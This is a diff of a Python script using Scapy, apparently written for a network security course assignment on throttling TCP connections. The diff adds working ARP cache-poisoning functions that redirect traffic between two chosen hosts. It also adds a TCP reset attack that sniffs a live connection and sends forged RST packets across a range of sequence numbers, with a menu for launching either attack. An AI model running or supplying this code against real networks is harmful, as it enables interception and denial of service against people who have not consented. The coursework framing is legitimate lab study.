@@ -1,26 +1,6 @@
 #!/usr/bin/env python
 
-# ### 2. Throttling TCP connections
-
-# For this part, you will need to have some familiarity with the TCP protocol to write low-level networking code using a library. 
-# Suggestions again are the `libnet/libpcap` library in the C programming language or the equivalent `Scapy` package in Python.
-
-# The objective of this task is to slow down or interrupt TCP connections by forcing retransmission of packets. 
-# An illustrative example of such an approach is the `tcpnice` program in the `dsniff` package which reduces windows advertised to artificially decrease bandwidth.
-#  We will adopt two different approaches: send 3 ACK packets to simulate packet loss and force retransmission; send a TCP reset packet to drop the connection altogether.
-
-# You will implement a tool that receives a source and destination IP addresses to listen for TCP connections and what approach for throttling should be used. 
-# The tool should be executed in a third node with access to the traffic.
-#  Whenever such a packet is captured, RST or 3 ACK packets should be sent back to the origin and/or destination.
-
-# For the experimental setup, you can try using virtual machines, or leveraging the VM used for practical exercises as a malicious node to interfere with
-#  connections between the host machine and another device.
-# Collect experimental evidence of the malicious behavior through Wireshark,
-#  and screenshots of the time taken to transmit a file using a file transfer (FTP or SSH) to show that it is indeed slower or interrupted when under attack.
-PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
-
 from ctypes import sizeof
-import socket 
 from socket import *
 from struct import *
 import sys
@@ -29,13 +9,17 @@ from scapy import sessions
 import scapy.all as scapy
 from scapy.layers.inet import IP, TCP
 import time
-import re
 
-#Run this script in CMD with admin
 
 def contains_192(s):
     if ("192." in s):
         return s
+
+def _input(message, input_type=int):
+    while True:
+        try:
+                return input_type (input(message))
+        except:pass
 
 def cleanlist(listof):
     retList = []
@@ -48,14 +32,7 @@ def cleanlist(listof):
                     pass
                 else:
                     retList.append(y)
-        
-
-        
-        # rSuffix.remove("https")
-        # retList.append(filter(contains_192, rSuffix))
     return retList
-
-        
 
 def GetList(filter):
     packet = scapy.sniff(filter=filter,
@@ -72,7 +49,6 @@ def GetList(filter):
     retList = cleanlist(ListOfIP)
         
     return retList
-
 
 def ChooseIP(IPList):
     i = 0
@@ -91,7 +67,7 @@ def ChooseIP(IPList):
             while True:
                 valsrc = _input("Choose Source\n")
                 # print("length of IPList {}".format(n))
-                if valsrc <= n & valsrc > 0:
+                if valsrc <= n and n>0:
                     src = IPList[valsrc-1]
                     IPList.pop(valsrc-1)
                     break
@@ -112,7 +88,7 @@ def ChooseIP(IPList):
             while True:
                 if IPList:
                     valdst = _input("Choose Destination\n")
-                    if valdst <= n-1 & valdst > 0:
+                    if valdst <= n-1 and valdst > 0:
                         dst = IPList[valdst-1]
                         break
                     else:
@@ -135,61 +111,105 @@ def ChooseIP(IPList):
     print("This is dst {}".format(dst))
     return src, dst
 
+def get_mac(ip):
+    # Create arp packet object. pdst - destination host ip address
+    arp_request = scapy.ARP(pdst=ip)
+    # Create ether packet object. dst - broadcast mac address. 
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    # Combine two packets in two one
+    arp_request_broadcast = broadcast/arp_request
+    # Get list with answered hosts
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
+                              verbose=False)[0]
+    # Return host mac address
+    return answered_list[0][1].hwsrc
 
-def _input(message, input_type=int):
-    while True:
-        try:
-                return input_type (input(message))
-        except:pass
+def spoof_delay(target_ip, host_ip, verbose=True):
+    # get the mac address of the target
+    target_mac = get_mac(target_ip)
+    # craft the arp 'is-at' operation packet, in other words; an ARP response
+    # we don't specify 'hwsrc' (source MAC address)
+    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
+    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+    # send the packet
+    # verbose = 0 means that we send the packet without printing any thing
+    verbose=0
+    for x in range(1,4):
+        print("{}. Package sent".format(x))
+        scapy.send(arp_response, verbose)
+        time.sleep(1)
 
+    if verbose:
+        # get the MAC address of the default interface we are using
+        self_mac = scapy.ARP().hwsrc
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
-def FindAvailPort(target):
-    print("Finding Ports, this may take a while")
-    OpenPorts = None
+def restore(target_ip, host_ip, verbose=True):
+    # get the real MAC address of target
+    target_mac = get_mac(target_ip)
+    # get the real MAC address of spoofed (gateway, i.e router)
+    host_mac = get_mac(host_ip)
+    # crafting the restoring packet
+    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+    # Send Restore message
+    scapy.send(arp_response, verbose=0, count=7)
+    if verbose:
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac)) 
+
+def spoof_Cancel(host_ip):
+    win=512
+    tcp_rst_count = 10
+
+    #Sniffing for packet specific to ip
+    t = scapy.sniff(count=5,
+          lfilter=lambda x: x.haslayer(TCP)
+          and x[IP].src == host_ip)
+
+    # Setting TCP header
+    t = t[0]
+    tcpdata = {
+        'src': t[IP].src,
+        'dst': t[IP].dst,
+        'sport': t[TCP].sport,
+        'dport': t[TCP].dport,
+        'seq': t[TCP].seq,
+        'ack': t[TCP].ack
+    }
+
+    #setting sequence numbers
+    max_seq = tcpdata['ack'] + tcp_rst_count * win
+    seqs = range(tcpdata['ack'], max_seq, int(win / 2))
+
+    # Setting IP Header
+    p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
+                TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
+                flags="R", window=win, seq=seqs[0])
+
+    #Sending reset attack for each sequence number
+    for seq in seqs:
+        p.seq = seq
+        scapy.send(p, verbose=0)
+
+def throttleFromIP(source, dest):
     try:
-        for port in range(1,65535):
-            s = socket(AF_INET, SOCK_STREAM)
-            setdefaulttimeout(1)
-
-            result=s.connect_ex((target,port))
-            if port == 100:
-                print("Reached 100")
-            if port == 1000:
-                print("Reached 1000")
-            if port == 10000:
-                print("Reached 10000")
-            if port == 30000:
-                print("Reached 30000")
-            if port == 60000:
-                print("Reached 60000")
-            if result == 0:
-                print("Port {} is open".format(port))
-                OpenPorts = port
-                s.close()
-                return OpenPorts 
-            s.close()
-            
+        while True:
+            spoof_delay(dest, source, verbose=True)
+            spoof_delay(source, dest, verbose=True)
+            time.sleep(2)
     except KeyboardInterrupt:
-        print("\n Exitting Program !!!!")
+        print("Cancelling Throttle Attack")
+        restore(dest, source)
+        restore(source, dest)
+
+def cancelConnection(source, dest):
+    try:
+        while True:
+            spoof_Cancel(source)
+            spoof_Cancel(dest)
+            time.sleep(1)
+    except:
+        print("\n Attempting to Cancel Reset Attack")
         sys.exit()
-    
-
-
-def throttleFromIP(src, dst, srcports, dstports):
-    print("Throttling src: {}, dst {}".format(src, dst))
-    scapy.send()
-
-def cancelConnection(source, dest, srcports, dstports, sequenc):
-    ip = IP(src=source, dst=dest)
-
-    tcp = TCP(sport=srcports,
-     dport=dstports, 
-     flags="R", seq=sequenc)
-
-    packet = ip/tcp
-    scapy.ls(packet)
-    scapy.sendp(packet, verbose=0)
-
 
 def main():
 
@@ -199,42 +219,18 @@ def main():
     IPList = GetList("tcp")
     src, dst = ChooseIP(IPList)
     
-
-    # These scans for open ports. Uncomment if scan is desired
-    # srcports = FindAvailPort(src)
-    # dstports = FindAvailPort(dst)
-    seq = 19
-    # Ports used for proof of concept
-    # can be found using wireshark
-    if (src=="192.168.0.26"):
-        srcports = 65432
-        dstports = 64534
-    if (src=="192.168.0.7"):
-        srcports = 64534
-        dstports = 65432
-
-
-    print("Found Source Port: {}, Destination port: {}".format(srcports, dstports))
-    while True:
-        choice = _input("Press 1 for Throttle \nPress 2 for Cancelling connection\n")
+    try:
+        choice = _input("Press 1 for Throttle Attack\nPress 2 for Reset Attack\n")
         if (choice == 1):
             print("Trying to throttle connection")
+            throttleFromIP(src,dst)
             print("Great success")
-            break
         if (choice == 2):
             print("Trying to cancel Connection")
-            cancelConnection(src,dst, srcports, dstports, seq)
-            print("Great Success")
-            break
-        else:
-            pass
-
-
-
-
-
-    #Throttling part
-    # throttleFromIP(src, dst)
+            cancelConnection(src, dst)
+    except:
+        print("\n Exitting Program !!!!")
+        sys.exit()
 
     print("end")
 
